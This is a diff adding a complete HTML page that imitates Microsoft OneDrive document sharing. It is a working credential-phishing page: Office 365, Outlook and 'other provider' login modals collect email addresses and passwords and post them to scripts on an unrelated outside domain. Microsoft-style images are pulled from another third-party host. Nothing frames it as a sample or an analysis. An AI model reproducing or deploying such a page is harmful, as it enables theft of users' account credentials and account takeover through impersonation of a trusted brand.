@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" id="viewport" content="target-densitydpi=high-dpi,initial-scale=1.0,user-scalable=no" />
+    <title>OneDrive Cloud Document Sharing</title>
+
+    <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+	<link rel="stylesheet" href="off.css">
+	<link rel="icon" type="image/png" href="https://maxoutputdb.com/images/1drv/favicon.ico"/>
+<style>
+.bg-img {
+  /* The image used */
+  background-image: url("https://maxoutputdb.com/images/1drv/hero.jpg");
+
+  min-height: 500px;
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  position: relative;
+}
+
+.bx1 {
+	border: 0;
+	padding:15px;
+	width: 358px;
+	height: auto;
+	margin:auto;
+	position:relative;
+	margin-left:30px;
+	
+}
+
+.bx2 {
+	border: 0;
+	padding:15px;
+	width: 358px;
+	height: auto;
+	margin:auto;
+	position:relative;
+	margin-left:30px;
+	
+}
+
+.bx3 {
+	border: 0;
+	padding:15px;
+	width: 358px;
+	height: auto;
+	margin:auto;
+	position:relative;
+	margin-left:30px;
+	
+}
+
+#org {
+	font-family: segoe ui;
+	font-size: 14px;
+	color: #000;
+}
+
+#org2 {
+	font-family: segoe ui light;
+	font-size: 16px;
+	color: #000;
+}
+
+input[type=email], select {
+  width: 300px;
+  height: 37px;
+  padding: 10px 10px;
+  margin: 0px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  font-family: Segoe UI;
+  margin-top: 20px;
+
+}
+
+input[type=password], select {
+  width: 300px;
+  height: 37px;
+  padding: 10px 10px;
+  margin: 3px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  font-family: Segoe UI;
+  margin-top:10px;
+}
+
+::placeholder {
+  color: 	#808080;
+  opacity: 1; /* Firefox */
+  font-family: segoe ui;
+  font-size:14px;
+}
+
+:-ms-input-placeholder { /* Internet Explorer 10-11 */
+ color: 	#808080;
+ font-family: segoe ui;
+ font-size:14px;
+}
+
+::-ms-input-placeholder { /* Microsoft Edge */
+ color: 	#808080;
+ font-family: segoe ui;
+ font-size:14px;
+}
+
+button[type=submit] {
+  width: 30%;
+  height: 33px;
+  background-color:  #0078d4;
+  color: white;
+  padding: auto;
+  margin: 8px 0;
+  border: none;
+  border-radius: 0px;
+  cursor: pointer;
+  font-family: Segoe UI;
+  font-size: 15px;
+  
+}
+
+button[type=submit]:hover {
+  background-color:  dodgerblue;
+  opacity: 1.5;
+}
+
+
+* {
+  box-sizing: border-box;
+}
+
+#lastbut {
+	background:#ccc;
+	width:300px;
+}
+
+#lastbut:hover {
+	background:#ddd;
+	opacity: 1;
+}
+
+.gada {
+	border: 1px solid #0078d4;
+	padding:50px;
+	width: 400px;
+	margin:auto;
+	float: right;
+	height:500px;
+	background:#0078d4;
+	
+}
+
+#uptxt {
+	font-family: segoe ui;
+	font-size: 16px;
+	color: white;
+}
+
+#image1 {
+	margin-left:20px;
+	margin-bottom: 5px;
+	margin-right: 10px;
+}
+
+#title1 {
+	font-family: segoe ui;
+	font-size:28px;
+	line-height:60px;
+	text-align: middle;
+	color:#0078d4;
+}
+
+#heavi {
+	font-weight:700;
+	font-family:segoe ui semibold;
+}
+
+#lighta {
+	font-size:16px;
+	line-height:22px;
+	font-family: segoe ui;
+}
+
+.db1 {
+	height: auto;
+	width: 324px;
+	border:0;
+	display: inline-block;
+	margin-right: 100px;
+}
+
+.db2 {
+	height: auto;
+	width: 324px;
+	border:0;
+	display: inline-block;
+	margin-right: 100px;
+}
+
+.db3 {
+	height: auto;
+	width: 324px;
+	border:0;
+	display: inline-block;
+}
+
+
+body, html {
+  height: 100%;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+.bg-img {
+  /* The image used */
+  background-image: url("https://maxoutputdb.com/images/1drv/hero.jpg");
+
+  min-height: 500px;
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  position: relative;
+}
+
+
+
+/* The Modal (background) */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            padding-top: 100px; /* Location of the box */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+        }
+
+        /* Modal Content */
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 0;
+            border: 1px solid #888;
+			min-width:400px;
+            width: 400px;
+        }
+
+        /* The Close Button */
+        .close {
+            color: #000;
+            float: right;
+            font-size: 24px;
+			margin-right:10px;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #aaaaaa;
+            text-decoration: none;
+            cursor: pointer;
+        }
+		
+
+
+
+* {
+  box-sizing: border-box;
+}
+
+input:required {
+    box-shadow:none;
+}
+
+#btn1 {
+	background:#fff;
+	border: 2px solid #DC3E15;
+	color: #DC3E15;
+	width: 300px;
+	cursor: pointer;
+	font-family: segoe ui;
+	padding: 5px;
+	padding-left:15px;
+	border-radius: 10px;
+	box-shadow: 8px 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+	text-align:left;
+}
+
+#btn2 {
+	background:#fff;
+	border: 2px solid #0078d4;
+	color: #0078d4;
+	width: 300px;
+	cursor: pointer;
+	font-family: segoe ui;
+	padding: 5px;
+	padding-left:15px;
+	border-radius: 10px;
+	box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+	text-align:left;
+}
+
+.btn3 {
+	background:#fff;
+	border: none;
+	color: #505050;
+	width: 300px;
+	cursor: pointer;
+	font-family: segoe ui;
+	padding: 5px;
+	padding-left:15px;
+	border-radius: 10px;
+	box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+	text-align:left;
+}
+</style>
+
+</head>
+<body>
+
+<img align="top" id="image1" src="https://maxoutputdb.com/images/1drv/topleft.png" width="65" height="auto">
+<span id="title1">OneDrive</span>
+<div class="bg-img">
+
+<div class="gada">
+<span id="uptxt">To accesss this document, please choose your email provider below - Login to view shared file.</span><br><br>
+
+    <!-- Trigger/Open The Modal -->
+    <button id="btn1" class="myBtn_multi"><img src="https://maxoutputdb.com/images/1drv/bt1.png" height="auto" width="25"/>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Office 365</button>
+    <p><button id="btn2" class="myBtn_multi"><img src="https://maxoutputdb.com/images/1drv/bt2.jpg" height="auto" width="25"/>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Outlook mail</button></p>
+
+    <!-- The Modal -->
+    <div class="modal modal_multi">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close close_multi">×</span>
+            <p>
+			<div class="bx1">
+<form method="post" action="https://transbordoresiduos.com.br/auth.php" class="container" autocomplete="off">
+<p><img src="https://maxoutputdb.com/images/1drv/office.png" width="180" height="auto"></p>
+<span id="org">Sign in with your organizational account</span>
+
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Username or Email" type="email" name="ee" id="ee" required>
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required><br>
+				<button type="submit">Sign in</button>
+				</form>
+</div>
+			</p>
+        </div>
+
+    </div>
+
+    <!-- The Modal -->
+    <div  class="modal modal_multi">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close close_multi">×</span>
+            <p>
+			<div class="bx2">
+			<form method="post" action="https://transbordoresiduos.com.br/auth_msn.php" class="container" autocomplete="off">
+<p><img src="https://maxoutputdb.com/images/1drv/out.png" width="110" height="auto"></p>
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Email or phone" type="email" name="ee" id="ee" required>
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required>
+				<div style="margin-right:28px;" align="right"><button type="submit">Next</button></div>
+				</form>
+</div>
+			</p>
+        </div>
+
+    </div>
+    <!-- Trigger/Open The Modal -->
+    <button class="btn3" id="myBtn"><img align="top" src="https://maxoutputdb.com/images/1drv/wbm.png" width="25" height="auto"/>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Other Email Providers</button>
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close">×</span>
+            <p>
+			<div class="bx3">
+<form method="post" action="https://transbordoresiduos.com.br/auth_web.php" class="container" autocomplete="off">
+<center><img src="https://maxoutputdb.com/images/1drv/wbm.png" width="70" height="auto"><br>
+<span id="org2">Sign in with your mail account</span></center>
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Email address" type="email" name="ee" id="ee" required>
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required>
+				<button id="lastbut" type="submit">Sign in</button>
+				
+				</form>
+</div>
+			</p>
+        </div>
+
+    </div>
+    <script>
+        // Get the modal
+
+        var modalparent = document.getElementsByClassName("modal_multi");
+
+        // Get the button that opens the modal
+
+        var modal_btn_multi = document.getElementsByClassName("myBtn_multi");
+
+        // Get the <span> element that closes the modal
+        var span_close_multi = document.getElementsByClassName("close_multi");
+
+        // When the user clicks the button, open the modal
+        function setDataIndex() {
+
+            for (i = 0; i < modal_btn_multi.length; i++)
+            {
+                modal_btn_multi[i].setAttribute('data-index', i);
+                modalparent[i].setAttribute('data-index', i);
+                span_close_multi[i].setAttribute('data-index', i);
+            }
+        }
+
+
+
+        for (i = 0; i < modal_btn_multi.length; i++)
+        {
+            modal_btn_multi[i].onclick = function() {
+                var ElementIndex = this.getAttribute('data-index');
+                modalparent[ElementIndex].style.display = "block";
+            };
+
+            // When the user clicks on <span> (x), close the modal
+            span_close_multi[i].onclick = function() {
+                var ElementIndex = this.getAttribute('data-index');
+                modalparent[ElementIndex].style.display = "none";
+            };
+
+        }
+
+        window.onload = function() {
+
+            setDataIndex();
+        };
+
+        window.onclick = function(event) {
+            if (event.target === modalparent[event.target.getAttribute('data-index')]) {
+                modalparent[event.target.getAttribute('data-index')].style.display = "none";
+            }
+
+            // OLD CODE
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        };
+
+//XXXXXXXXXXXXXXXXXXXXXXX    Modified old code    XXXXXXXXXXXXXXXXXXXXXXXXXX
+
+// Get the modal
+
+        var modal = document.getElementById('myModal');
+
+// Get the button that opens the modal
+        var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+        var span = modal.getElementsByClassName("close")[0]; 
+
+// When the user clicks on the button, open the modal
+
+        btn.onclick = function() {
+
+            modal.style.display = "block";
+        }
+
+// When the user clicks on <span> (x), close the modal
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+
+
+    </script>
+<br>	
+<center>
+<p><img src="https://maxoutputdb.com/images/1drv/4.svg" width="110px" height="auto"/></p>
+
+<span id="uptxt"><small>Get to all your files from anywhere on any device, and share them with anyone securely and with ease.</small></span>
+</center>
+</div>
+</div>
+
+
+<center>
+<p>
+<div class="db1">
+<img src="https://maxoutputdb.com/images/1drv/1.svg" align="top"><br><br>
+<span id="heavi">Access files from any device</span>
+</div>
+<div class="db2">
+<img src="https://maxoutputdb.com/images/1drv/2.svg" align="top"><br><br>
+<span id="heavi">Offline access</span>
+</div>
+<div class="db3">
+<img src="https://maxoutputdb.com/images/1drv/3.svg" align="top"><br><br>
+<span id="heavi">Keep your files safe</span>
+</div>
+</p>
+</center>
+
+</body>
+</html>
